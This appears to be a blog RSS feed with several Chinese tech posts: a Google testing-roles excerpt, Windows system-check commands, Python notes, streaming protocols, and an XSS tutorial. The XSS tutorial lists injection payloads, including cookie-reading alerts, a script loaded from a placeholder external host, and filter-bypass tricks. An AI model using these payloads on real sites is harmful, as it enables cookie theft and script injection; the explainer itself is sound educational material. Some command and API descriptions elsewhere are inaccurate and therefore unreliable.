&lt;p&gt;在Google，写代码的开发人员也承担了质量的重任。&lt;strong&gt;质量从来就不仅仅是一些测试的问题&lt;/strong&gt;。在Google，每个写代码的开发者本身就是测试者，质量在名义上也由这样的开发测试组合共同承担。在Google，谈论开发测试比（译注：这里指在人员数量上，开发和测试的比率）就像讨论太阳表面的空气质量一样，这本身没有任何意义。如果你是一名工程师，那么你同时也是一名测试人员。如果在你的职位头衔上有测试的字样，你的任务就是怎样使那些头衔上没有测试的人可以更好地去做测试。&lt;/p&gt;
&lt;p&gt;质量不是被测试出来的——这句看似陈词滥调的话却包含着一定的道理。从汽车行业到软件行业，如果在最开始设计创建的时候就是错的，那它永远不会变成正确的。试问一下汽车行业的公司，大量召回事实上有质量问题的产品，代价是多么的昂贵。因此，从最初的创建阶段就要做正确，否则将会陷入混乱的万劫深渊。然而，这句话也并不像听起来那样的简单和准确。虽然质量不是被测出来的，但同样有证据可以表明，未经测试也不可能开发出有质量的软件。如果连测试都没有做，如何保证你的软件具有很高的质量呢？&lt;/p&gt;
&lt;p&gt;有一个简单的办法可以解决这个难题，那就是停止开发与测试的隔离对立。开发和测试应该并肩齐趋。你的每一段代码写完后都要立刻测试这段代码，当完成了更多的代码时就做更多的测试。&lt;strong&gt;测试不是独立隔离的活动，它本身就是开发过程的一部分。质量不等于测试，当你把开发过程和测试放到一起，就像在搅拌机里混合搅拌那样，直到不能区分彼此的时候，你就得到了质量。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在Google，这正是我们的目标，就是把开发过程和测试融合在一起——开发和测试必须同时开展。写一段代码就立刻测试这段代码，完成更多的代码就做更多的测试，但这里的关键是由谁来做这些测试呢？众所周知，在Google，专职测试人员的数量非常稀少，与开发相比根本不成比例，唯一可能的去做这些的就只能是开发人员。还有谁能比实际写代码的人更适合做测试呢？还有谁能比实际写代码的人更适合去寻找bug呢？是谁会为了避免受更大刺激而去想办法避免产生bug呢？Google能用如此少的专职测试人员的原因，就是开发对质量的负责。如果某个产品出了问题，第一个跳出来的肯定是导致这个问题发生的开发人员，而不是遗漏这个bug的测试人员。&lt;/p&gt;
&lt;p&gt;这意味着质量更像是一种预防行为，而不是检测。质量是开发过程的问题，而不是测试问题。我们已经成功地将测试实践融入为开发过程的一部分，并创建了一个增量上线的流程。如果一些项目在线上被证实的确是bug重重，它将会被回滚到之前的版本。在确保不出现回滚级别bug发生的前提下，预防了许多客户问题的同时，也很大程度降低了专职测试人员的数量。在Google，测试的目标就是来判断这种预防工作做的怎么样。&lt;/p&gt;
&lt;h2 id=&#34;软件开发工程师swe&#34;&gt;软件开发工程师（SWE）&lt;/h2&gt;
&lt;p&gt;软件开发工程师（译注：software engineer，后文简称SWE）是一个传统上的开发角色，他们的工作是实现最终用户使用的功能代码。他们创建设计文档、选择最优的数据结构和整体架构，并且花费大量时间在代码实现与代码审查上。SWE需要编写与测试代码，包括测试驱动的设计、单元测试、参与构建各种规模的测试等，这些测试会在本章的后面做详细解释。SWE会对他们编写、修复以及修改的代码承担质量责任。如果一个开发者不得不修改一个函数，或者这次修改导致已有测试用例运行失败，或者需要增加一个新的测试用例，他就必须去实现这个测试用例的代码。开发工程师几乎将所有的时间都花费在了代码编写上。&lt;/p&gt;
&lt;h2 id=&#34;软件测试开发工程师set&#34;&gt;软件测试开发工程师（SET）&lt;/h2&gt;
&lt;p&gt;软件测试开发工程师（译注：software engineer in test，后文简称SET）也是一个开发角色，只是工作重心在可测试性和通用测试基础框架上。他们参与设计评审，非常近距离地观察代码质量与风险。为了增加可测试性，他们甚至会对代码进行重构，并编写单元测试框架和自动化测试框架。SET是SWE在代码库上的合作伙伴，相比较SWE是在增加功能性代码或是提高性能的代码，SET更加关注于质量提升和测试覆盖率的增加。SET同样会花费近百分之百的时间在编写代码上，他们这样做的目的是为质量服务，而SWE则更关注在客户使用功能开发的实现上。&lt;/p&gt;
&lt;h2 id=&#34;测试工程师te&#34;&gt;测试工程师（TE）&lt;/h2&gt;
&lt;p&gt;测试工程师（译注：test engineer，后文简称TE）是一个和SET关系密切的角色，有自己不同的关注点&amp;ndash;把用户放在第一位来思考，代表用户的利益。一些Google的TE会花费大量时间在模拟用户的使用场景和自动化脚本或代码上。同时，他们会把开发工程师和SET编写的测试分门别类地组织起来，分析、解释、测试运行结果，驱动测试执行，特别是在项目的最后阶段，推进产品发布。TE是真正的产品专家、质量顾问和风险分析师。某些TE需要编写大量的代码，而另外一些TE则只用编写少量的代码。&lt;/p&gt;
&lt;h2 id=&#34;组织架构&#34;&gt;组织架构&lt;/h2&gt;
&lt;p&gt;在多数组织中，开发人员和测试人员都一起隶属于同一个工程产品团队。从组织架构上讲，开发人员和测试人员汇报给同一个产品团队的管理者。这样看起来，同一个产品、同一个团队、所有参与的人都在一起，应该可以做到平等相处、患难与共。但不幸的是，我还从来没见过有团队能真正做到这样。资深管理者一般都是产品经理或开发经理，而不是来自于测试团队。在产品发布时，优先考虑的是功能是否完整和易用性方面是否足够简单，却很少考虑质量问题。作为同一个团队，测试总是在为开发让路。为何我们这个行业里总是充斥着各种有缺陷的、早产的产品，或许这就是问题所在。不行就再发布一个补丁包。&lt;/p&gt;
&lt;p&gt;Google的组织汇报架构被划分为不同的专注领域（Focus Areas）。这些专注领域包括客户端（Chrome、Google工具栏等）、地理（地图、Google Earth等）、广告、Apps、移动，等等。所有的开发工程师汇报给这些专注领域的管理者、总监或副总裁。&lt;/p&gt;
&lt;p&gt;但SET和TE并没有遵循这个模式。测试是独立存在的部门，是与专注领域部门平行的部门（横跨各个产品专注领域），我们称之为工程生产力团队。测试人员基本上以租借的方式进入到产品团队，去做提高质量相关的事情，寻找一些测试不足的地方，或者公开一些不可接受的缺陷率数据。由于测试人员并不是直接向产品团队进行汇报，因此我们并不是简单地被告之某个项目急需发布就可以通过测试。我们有自己选择决定的优先级，在可靠性、安全性等问题上都不会妥协，除非碰到更重要的事情。如果开发团队想要我们在测试上放他们一马，他们必须事先和我们协商，但一般情况下都会被拒绝。&lt;/p&gt;
&lt;p&gt;这样的组织结构也可以帮助我们保持数量较少的测试人员。一个产品团队不能任意降低测试人员招聘的技术要求，从而雇佣更多的测试人员，然后再让他们做一些简单和琐碎的脏活累活。这些功能相关的脏活累活本应是开发人员的工作，不能简单地扔给倒霉的测试人员。工程生产力团队会根据不同产品团队的优先级、复杂度和其他产品的实际比较后，再来分配测试人员。显然，有时候我们可能搞错，实际上也确实出过错，但总体上来说，这样会保持实际的需求与不明确的需求之间的某种平衡。&lt;/p&gt;
&lt;p&gt;这种测试人员在不同项目之间的借调模式，可以让SET和TE时刻保持新鲜感并且总是很忙碌，另外还能保证一个好的测试想法可以快速在公司内部蔓延。一个在Geo产品上运用很好的测试技术或工具，很有可能在Chrome产品中也得到使用。推广测试技术方面创新的最佳方式，莫过于把这个创新的发明者直接借调过来。&lt;/p&gt;
&lt;p&gt;在Google有一个广泛被接受的做法：对于一个测试人员，如果在某个产品中工作满18个月之后，就可以无理由地自愿转岗到其他产品，当然这个转岗并不是强制的。可以想象一个产品失去优秀测试专家而带来的悲痛，但从整个公司的角度来看，需要保持对各个产品与技术都了解的测试人员的存在。Google的测试工程师在客户端、web、浏览器、移动技术等领域都有所涉猎，可以高效地使用不同的语言和平台。由于Google的产品和服务很大程度上有比较强的集成关联关系，测试人员可以很容易地保持相关的专业技能，并在公司范围内的产品之间自由穿梭。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Windows—执行系统自检</title>
        <link>https://ac-lm.github.io/posts/windows10/windows%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%87%AA%E6%A3%80/</link>
        <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/windows10/windows%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%87%AA%E6%A3%80/</guid>
        <description>&lt;h2 id=&#34;1实现&#34;&gt;1.实现&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;# 系统自检命令
sfc /SCANNOW
# 扫描系统文件并和官方服务器上文件进行对比，查找是否存在系统文件和官方不一致的情况
Dism /Online /Cleanup-Image /ScanHealth
# 联网下载与官方不同的系统文件进行替换
Dism /Online /Cleanup-Image /CheckHealth
# 将系统中和官方不同的系统文件直接还原成源文件
DISM /Online /Cleanup-image /RestoreHealth
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—什么是 XSS</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-xss/</link>
        <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-xss/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/wuqun/p/12484816.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; XSS(跨站脚本攻击)详解  @615 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1简单介绍&#34;&gt;1.简单介绍&lt;/h2&gt;
&lt;p&gt;HTML 注入与 XSS 攻击简单来说就是当用户在输入框输入内容时，后台对输入内容不做处理就直接添加入页面。此时，&lt;strong&gt;用户可以刻意填写 HTML、JavaScript 脚本来作为文本输入&lt;/strong&gt;，这样这个页面就会出现一些用户加入的东西了。比如用户输入以下内容：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当后台将该内容直接展示时，就会在前台展示出一个跳转至百度的链接。因此网站需要对用户的输入进行过滤，以避免该问题的出现。&lt;/p&gt;
&lt;p&gt;为了避免这些问题，网站通常都会屏蔽 script 标签的输入，但这并不严谨，用户还可以利用类似于以下的语句来实现注入。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;img src=1 οnerrοr=alert(1)/&amp;gt;
&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因此，相比起过滤 script 标签，更建议过滤 &lt;code&gt;&amp;lt;, &amp;gt;, &amp;amp;&lt;/code&gt;等符号。&lt;/p&gt;
&lt;h2 id=&#34;2xss&#34;&gt;2.XSS&lt;/h2&gt;
&lt;p&gt;跨站脚本攻击 XSS ( Cross Site Scripting )，为了不和层叠样式表 ( Cascading Style Sheets，CSS ) 的缩写混淆，所以将跨站脚本攻击缩写为 XSS。恶意攻击者往往会在 Web 页面里插入恶意 JavaScript 代码，当用户浏览该页面时，嵌入 Web 里面的 JavaScript 代码会被执行，从而达到恶意攻击用户的目的。&lt;/p&gt;
&lt;p&gt;XSS 攻击主要分为以下三种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存储型 XSS：持久化的攻击。如果恶意攻击者在个人信息或发表文章等地方，插入代码，后端又没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。&lt;/li&gt;
&lt;li&gt;反射型 XSS：非持久化的攻击。需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。&lt;/li&gt;
&lt;li&gt;DOM 型 XSS：不经过后端的攻击。DOM-XSS 漏洞是基于文档对象模型 ( Document Objeet Model，DOM ) 的一种漏洞，DOM-XSS 是通过 URL 传入参数去控制触发的。可能触发 DOM 型 XSS 的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在 URL 中传入参数的值，然后客户端页面通过 JavaScript 脚本利用 DOM 的方法获得 URL 中参数的值，再通过 DOM 方法进行赋值或其他操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3xss-的攻击载荷&#34;&gt;3.XSS 的攻击载荷&lt;/h2&gt;
&lt;h3 id=&#34;script-标签&#34;&gt;script 标签&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;hack&amp;quot;)&amp;lt;/script&amp;gt;   # 弹出 hack
&amp;lt;script&amp;gt;alert(/hack/)&amp;lt;/script&amp;gt;   # 弹出 hack
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;        # 弹出 1，对于数字可以不用引号
&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;      # 弹出 cookie
&amp;lt;script src=http://xxx.com/xss.js&amp;gt;&amp;lt;/script&amp;gt;  # 引用外部的 xss
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;svg-标签&#34;&gt;svg 标签&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;svg onload=&amp;quot;alert(1)&amp;quot;&amp;gt;
&amp;lt;svg onload=&amp;quot;alert(1)&amp;quot;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;img-标签&#34;&gt;img 标签&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;img  src=1  οnerrοr=alert(&amp;quot;hack&amp;quot;)&amp;gt;
&amp;lt;img  src=1  οnerrοr=alert(document.cookie)&amp;gt;  # 弹出cookie
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;body-标签&#34;&gt;body 标签&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;body οnlοad=alert(1)&amp;gt;
&amp;lt;body οnpageshοw=alert(1)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;video-标签&#34;&gt;video 标签&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;video οnlοadstart=alert(1) src=&amp;quot;/media/hack-the-planet.mp4&amp;quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;style-标签&#34;&gt;style 标签&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;style οnlοad=alert(1)&amp;gt;&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4xss-漏洞的挖掘&#34;&gt;4.XSS 漏洞的挖掘&lt;/h2&gt;
&lt;p&gt;尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL的每一个参数&lt;/li&gt;
&lt;li&gt;URL本身&lt;/li&gt;
&lt;li&gt;表单&lt;/li&gt;
&lt;li&gt;搜索框&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常见业务场景&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;重灾区：评论区、留言区、个人信息、订单信息等&lt;/li&gt;
&lt;li&gt;针对型：站内信、网页即时通讯、私信、意见反馈&lt;/li&gt;
&lt;li&gt;存在风险：搜索框、当前目录、图片属性等&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5xss-的简单过滤和绕过&#34;&gt;5.XSS 的简单过滤和绕过&lt;/h2&gt;
&lt;h3 id=&#34;a区分大小写过滤标签&#34;&gt;a.区分大小写过滤标签&lt;/h3&gt;
&lt;p&gt;可以使用大小写绕过&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;scripT&amp;gt;alert(&#39;hack&#39;)&amp;lt;/scripT&amp;gt;
&amp;lt;sCript&amp;gt;alert(&amp;quot;hey!&amp;quot;)&amp;lt;/scRipt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;b不区分大小写过滤标签&#34;&gt;b.不区分大小写过滤标签&lt;/h3&gt;
&lt;p&gt;可以使用嵌套的 script 标签绕过&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(&#39;hack&#39;)&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;c不区分大小写过滤之间的所有内容&#34;&gt;c.不区分大小写，过滤之间的所有内容&lt;/h3&gt;
&lt;p&gt;可以通过 img、body 等标签的 onerror 事件或者 iframe 等标签的 src 注入恶意的 JavaScript 代码。onerror 事件是专门针对 js 出错的，标签闭合性被破坏会触发这个事件。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;d编码脚本代码绕过关键字过滤&#34;&gt;d.编码脚本代码绕过关键字过滤&lt;/h3&gt;
&lt;p&gt;有的时候，服务器往往会对代码中的关键字（ 如 alert ）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入。我们可以用 eval() 将编码过的语句解码后再执行。例如：&lt;code&gt;alert(1) = eval(\u0061\u006c\u0065\u0072\u0074(1))&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;eval(\u0061\u006c\u0065\u0072\u0074(1))&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;e主动闭合标签实现注入代码&#34;&gt;e.主动闭合标签实现注入代码&lt;/h3&gt;
&lt;p&gt;有些注入点出现在链接或属性中，此时可以使用&lt;code&gt;&amp;quot;&lt;/code&gt;主动的闭合标签，实现代码的注入&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;;alert(&amp;quot;I am coming again~&amp;quot;);&amp;quot;
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Python—random 模块</title>
        <link>https://ac-lm.github.io/posts/python/pythonrandom-%E6%A8%A1%E5%9D%97/</link>
        <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonrandom-%E6%A8%A1%E5%9D%97/</guid>
        <description>&lt;h2 id=&#34;1randomrandrangea-b-c&#34;&gt;1.random.randrange(a, b, c)&lt;/h2&gt;
&lt;p&gt;返回给定范围 [a, b) 内的随机整数，不包括b，第三个参数为步长，只能返回该范围内特定的数，比如该例子中[1,4,7,…,97]&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; random.randrange(1,100)
68
&amp;gt;&amp;gt;&amp;gt; random.randrange(1,100,3)
16
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2randomrandinta-b&#34;&gt;2.random.randint(a, b)&lt;/h2&gt;
&lt;p&gt;返回 [1,100] 范围内的随机数整数，包括100，第三个参数同random.randrange()用法一样&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; random.randint(1,100)
17
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3randomrandom&#34;&gt;3.random.random()&lt;/h2&gt;
&lt;p&gt;返回 [0, 1) 范围内随机浮点数，不包括1&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; random.random()
0.41385723239524297
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4randomchoice&#34;&gt;4.random.choice()&lt;/h2&gt;
&lt;p&gt;在给定容器中随机选择一个元素&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rand = [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;]
temp = choice(rand)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5randomsamplea&#34;&gt;5.random.sample(a)&lt;/h2&gt;
&lt;p&gt;在给定容器中随记选择特定数量元素&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; random.sample(&amp;quot;abcde&amp;quot;,2)
[&#39;e&#39;, &#39;b&#39;]  
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;6randomshuffle&#34;&gt;6.random.shuffle()&lt;/h2&gt;
&lt;p&gt;随机打乱传入的容器(容器必须是可变对象)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; l = [1,2,3,4]
&amp;gt;&amp;gt;&amp;gt; random.shuffle(l)
&amp;gt;&amp;gt;&amp;gt; l
[1, 3, 2, 4]
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—什么是推流与拉流</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A8%E6%B5%81%E4%B8%8E%E6%8B%89%E6%B5%81/</link>
        <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A8%E6%B5%81%E4%B8%8E%E6%8B%89%E6%B5%81/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/7d0d452063d9&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 视频推流与拉流 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1推流&#34;&gt;1.推流&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291730234.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291730234.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;推流，指的是把采集阶段封包好的内容传输到服务器的过程。主流的推送协议和优缺点如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RTMP：Real Time Messaging Protocol（实时消息传输协议），是Adobe公司为Flash/AIR平台和服务器之间音、视频及数据传输开发的实时消息传送协议。RTMP协议基于TCP，包括RTMP基本协议及RTMPT/RTMPS/RTMPE等多种变种。RTMP协议中，视频必须是H264编码，音频必须是AAC或MP3编码，且多以flv格式封包。RTMP是目前最主流的流媒体传输协议，对CDN支持良好，实现难度较低，是大多数的直播平台的选择。不过RTMP有着一个最大的不足——不支持浏览器，且Adobe已不再更新。因此直播服务要支持浏览器的话，需要另外的推送协议支持。&lt;/li&gt;
&lt;li&gt;HLS：Http Live Streaming是由Apple公司定义的基于HTTP的流媒体实时传输协议。它的原理是将整个流分为多个小的文件来下载，每次只下载若干个。服务器端会将最新的直播数据生成新的小文件，客户端只要不停的按顺序播放从服务器获取到的文件，就实现了直播。基本上，HLS是以点播的技术实现了直播的体验。因为每个小文件的时长很短，客户端可以很快地切换码率，以适应不同带宽条件下的播放。分段推送的技术特点，决定了HLS的延迟一般会高于普通的流媒体直播协议。传输内容包括两部分：一是M3U8描述文件，二是TS媒体文件。TS媒体文件中的视频必须是H264编码，音频必须是AAC或MP3编码。由于数据通过HTTP协议传输，所以完全不用考虑防火墙或者代理的问题，而且分段文件的时长很短。&lt;/li&gt;
&lt;li&gt;WebRTC：Web Real-Time Communication，即“源自网页即时通信”。WebRTC是一个支持浏览器进行实时语音、视频对话的开源协议。WebRTC的支持者甚多，Google、Mozilla、Opera推动其成为W3C推荐标准。WebRTC支持目前的主流浏览器，并且基于SRTP和UDP，即便在网络信号一般的情况下也具备较好的稳定性。此外，WebRTC可以实现点对点通信，通信双方延时低，此外，WebRTC可以实现点对点通信，通信双方延时低，是实现“连麦”功能比较好的选择。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2拉流&#34;&gt;2.拉流&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291730240.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291730240.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;拉流是指服务器已有直播内容，用指定地址进行拉取的过程，即推流是直播端，拉流是客户端&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—深复制与浅复制</title>
        <link>https://ac-lm.github.io/posts/python/python%E6%B7%B1%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%B5%85%E5%A4%8D%E5%88%B6/</link>
        <pubDate>Sun, 28 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E6%B7%B1%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%B5%85%E5%A4%8D%E5%88%B6/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/wilber2013/p/4645353.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 图解Python深拷贝和浅拷贝  @田小计划  &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1对象赋值&#34;&gt;1.对象赋值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;will &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Will&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Python&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C#&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JavaScript&amp;#34;&lt;/span&gt;]]
wilber &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; will
print id(will)
print will
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; will]
print id(wilber)
print wilber
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; wilber]

will[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wilber&amp;#34;&lt;/span&gt;
will[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CSS&amp;#34;&lt;/span&gt;)
print id(will)
print will
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; will]
print id(wilber)
print wilber
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; wilber]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051038771.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051038771.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;代码分析&#34;&gt;代码分析&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;首先，创建了一个名为will的变量，这个变量指向一个list对象，从第一张图中可以看到所有对象的地址（每次运行，结果可能不同）&lt;/li&gt;
&lt;li&gt;然后，通过will变量对wilber变量进行赋值，那么wilber变量将指向will变量对应的对象（内存地址），也就是说&amp;quot;wilber is will&amp;quot;，&amp;ldquo;wilber[i] is will[i]&amp;quot;，可以理解为，Python中，对象的赋值都是进行对象引用（内存地址）传递&lt;/li&gt;
&lt;li&gt;第三张图中，由于will和wilber指向同一个对象，所以对will的任何修改都会体现在wilber上，这里需要注意的一点是，str是不可变类型，所以当修改的时候会替换旧的对象，产生一个新的地址39758496&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051039148.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051039148.png&#34;
			
			
			
